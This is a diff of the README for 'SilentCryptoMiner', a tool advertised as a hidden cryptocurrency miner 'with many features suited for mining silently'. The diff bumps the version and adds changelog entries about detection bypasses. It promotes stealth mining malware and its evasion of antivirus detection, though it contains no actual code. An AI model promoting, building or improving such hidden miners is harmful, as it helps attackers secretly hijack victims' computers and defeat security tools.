@@ -1,6 +1,6 @@
 <img src="https://github.com/UnamSanctam/SilentCryptoMiner/blob/master/SilentCryptoMiner.png?raw=true">
 
-# SilentCryptoMiner v3.0.1 - Miner for ETH, ETC, XMR, RTM & many more
+# SilentCryptoMiner v3.0.2 - Miner for ETH, ETC, XMR, RTM & many more
 
 A free silent (hidden) native cryptocurrency miner capable of mining ETH, ETC, XMR, RTM and much more, with many features suited for mining silently.
 
@@ -76,6 +76,10 @@ You can find the web panel that the miner officially supports here: [UnamWebPane
 
 ## Changelog
 
+### 3.0.2 (09/09/2022)
+* Added GPU check support for some Radeon RX GPUs
+* Added more API function bypasses for lower possible future detections
+* Changed compiler paths from relative to absoulte paths
 ### 3.0.1 (07/09/2022)
 * Fixed GPU checking when running as the System user
 * Future-proofed some possible future detections
